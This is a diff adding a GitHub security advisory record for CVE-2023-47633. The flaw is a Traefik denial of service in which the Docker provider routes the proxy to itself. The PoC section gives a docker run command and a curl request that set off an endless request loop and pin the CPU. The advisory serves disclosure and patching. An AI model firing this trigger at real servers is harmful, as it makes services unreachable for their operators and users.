@@ -1,0 +1,89 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-6fwg-jrfw-ff7p",
+  "modified": "2023-12-05T18:13:54Z",
+  "published": "2023-12-05T18:13:53Z",
+  "aliases": [
+    "CVE-2023-47633"
+  ],
+  "summary": "Traefik docker container using 100% CPU",
+  "details": "### Summary\n\nThe traefik docker container uses 100% CPU when it serves as its own backend, which is an automatically generated route resulting from the Docker integration in the default configuration.\n\n### Details\n\nWhile attempting to set up Traefik to handle traffic for Docker containers, I observed in the webUI a rule with the following information:\n\n`Host(traefik-service) | webwebsecure | traefik-service@docker | traefik-service`\n\nI assumed that this is something internal; however, I wondered why it would have a host rule on the web entrypoint configured.\n\nSo I have send a request with that hostname with `curl -v --resolve \"traefik-service:80:xxx.xxx.xxx.xxx\" http://traefik-service`. That made my whole server unresponsive.\n\nI assume the name comes from a docker container with that name, traefik itself:\n```\nlocalhost ~ # docker ps\nCONTAINER ID   IMAGE                                                   COMMAND                  CREATED             STATUS         PORTS                                                                                                NAMES\nd1414e74aec7   traefik:v2.10                                           \"/entrypoint.sh trae…\"   4 minutes ago       Up 4 minutes   0.0.0.0:80->80/tcp, :::80->80/tcp, 0.0.0.0:443->443/tcp, :::443->443/tcp, 127.0.0.1:8080->8080/tcp   traefik.service\n```\n\n### PoC\n\n1. Start traefik with `docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -p 80:80 --name foo -p 8080:8080 traefik:v2.10 --api.insecure=true --providers.docker`\n\n2. `curl -v --resolve \"foo:80:127.0.0.1\" http://foo`\n\nlooks like this creates an endless loop of request.\n\nKnowing the name of the docker container seems to be enough to trigger this, if the docker backend is used.\n\n### Impact\n\nServer is unreachable and uses 100% CPU",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v2"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.10.6"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.0.0-beta5"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-6fwg-jrfw-ff7p"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47633"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/traefik/traefik"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v2.10.6"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-400",
+      "CWE-770"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-12-05T18:13:53Z",
+    "nvd_published_at": "2023-12-04T21:15:34Z"
+  }
+}
